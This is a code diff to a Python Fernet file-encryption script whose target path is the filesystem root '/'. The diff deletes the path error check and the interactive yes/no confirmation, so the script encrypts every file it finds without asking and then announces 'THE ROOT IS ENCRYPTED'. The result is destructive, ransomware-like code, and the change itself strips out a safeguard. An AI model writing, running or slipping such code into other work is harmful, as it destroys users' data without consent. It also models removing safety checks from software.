@@ -1,6 +1,5 @@
 import os
 from cryptography.fernet import Fernet
-import keygen
 
 
 path = "/"
@@ -50,24 +49,15 @@ elif os.path.isdir(path):
         for i in file_names:
             files.append(os.path.abspath(os.path.join(root, i)))
 
-else:
-    print("error occured. please check the path")
-    exit()
+
 
 # print("THE BELOW MENTIONED FILES WILL BE ENCRYPTED")
 for i in files:
     print(i)
 print("\nTHE ABOVE MENTIONED FILES WILL BE ENCRYPTED\n")
 
-choice = input("type yes to encrypt or no to quit : ")
-print("\n")
-if choice.lower() == "yes":
-    for i in files:
-        print("encrypting : ", i)
-        encrypt_file(key_file, i)
+for i in files:
+    print("encrypting : ", i)
+    encrypt_file(key_file, i)
 
-print("\nALL FILE ARE ENCRYPTED ")
-
-if choice.lower() == "no":
-    print("aborting the program, bye...")
-    exit()
+print("\n THE ROOT IS ENCRYPTED ")
